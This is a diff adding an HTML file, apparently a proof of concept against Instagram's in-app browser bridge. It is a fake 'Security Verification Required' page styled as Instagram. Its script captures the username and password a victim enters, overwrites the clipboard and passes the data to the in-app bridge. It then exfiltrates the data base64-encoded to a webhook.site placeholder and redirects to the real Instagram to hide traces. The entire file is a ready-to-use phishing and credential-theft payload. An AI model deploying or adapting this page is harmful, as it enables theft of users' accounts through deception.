@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Security Update</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; padding: 0; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
+        .insta-logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; text-align: center; }
+        p { color: #8e8e8e; font-size: 14px; text-align: center; margin-bottom: 20px; }
+        input { width: 100%; max-width: 300px; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; }
+        .btn-login { width: 100%; max-width: 300px; background-color: #0095f6; color: white; padding: 10px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .status-msg { margin-top: 15px; font-size: 12px; color: red; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="overlay" id="pwnedUI">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo">
+        <h2>Security Verification Required</h2>
+        <p>Your session is about to expire. Please confirm your credentials to continue using Instagram.</p>
+        
+        <input type="text" id="fakeUser" placeholder="Phone number, username, or email">
+        <input type="password" id="fakePass" placeholder="Password">
+        <button class="btn-login" onclick="hijackSession()">Log In</button>
+        
+        <div id="status" class="status-msg"></div>
+    </div>
+
+    <script>
+        // Attacker Webhook
+        const webhook = "https://webhook.site/YOUR_UNIQUE_ID";
+
+        async function hijackSession() {
+            const user = document.getElementById('fakeUser').value;
+            const pass = document.getElementById('fakePass').value;
+            const status = document.getElementById('status');
+
+            if(!user || !pass) { alert("Please enter credentials"); return; }
+
+            status.innerText = "> Intercepting via Bridge...";
+
+            // IMPACT 1: DATA EXFILTRATION (Credential Theft)
+            const stolenData = {
+                "username": user,
+                "password": pass,
+                "userAgent": navigator.userAgent,
+                "bridgeDetected": !!window.iabjs_unified_bridge,
+                "location": window.location.href
+            };
+
+            // IMPACT 2: CLIPBOARD STEALING (Simultaneous Attack)
+            try {
+                await navigator.clipboard.writeText("HACKED_SESSION_" + btoa(user));
+            } catch(e) {}
+
+            // IMPACT 3: BRIDGE CALL (Attempts to send stolen data to bridge context)
+            if (window.iabjs_unified_bridge) {
+                window.iabjs_unified_bridge.postMessage(JSON.stringify({"action": "log_event", "data": stolenData}));
+            }
+
+            // Exfiltrate to your server
+            fetch(webhook + "?data=" + btoa(JSON.stringify(stolenData)))
+            .then(() => {
+                status.innerText = "> Success. Redirecting to official app...";
+                setTimeout(() => {
+                    // Redirect back to real Instagram profile to hide traces
+                    window.location.href = "https://instagram.com/instagram";
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
